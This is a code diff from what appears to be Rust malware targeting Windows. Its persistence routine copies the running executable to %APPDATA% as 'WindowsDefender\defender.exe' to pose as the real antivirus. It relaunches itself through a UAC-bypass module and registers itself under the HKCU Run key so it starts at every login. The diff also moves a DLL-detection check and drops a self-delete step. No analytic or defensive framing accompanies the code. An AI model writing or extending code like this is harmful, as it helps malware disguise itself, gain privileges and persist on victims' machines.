@@ -1,5 +1,5 @@
 #[cfg(target_os = "windows")]
-mod is_dll;
+
 use winreg::enums::{*};
 use winreg::RegKey;
 use winreg::enums;
@@ -13,10 +13,9 @@ use crate::uac_bypass;
 const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
 
 #[cfg(target_os = "windows")]
-
-pub fn persist() -> std::io::Result<()> {
+pub fn persist(is_dll:bool) -> std::io::Result<()> {
     // Resolve %APPDATA%
-    if is_dll::is_dll(){
+    if is_dll{
         return Ok(())
     }
     let appdata = env::var("APPDATA")
@@ -34,11 +33,9 @@ pub fn persist() -> std::io::Result<()> {
     // Copy itself if not already there
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
-        fs::remove_file(&current_exe)?;
         uac_bypass::launch_with_fsr_disabled(&target_path.to_string_lossy().to_string())?;
         std::process::exit(0);
     }
-
     // Registry persistence
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
     let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
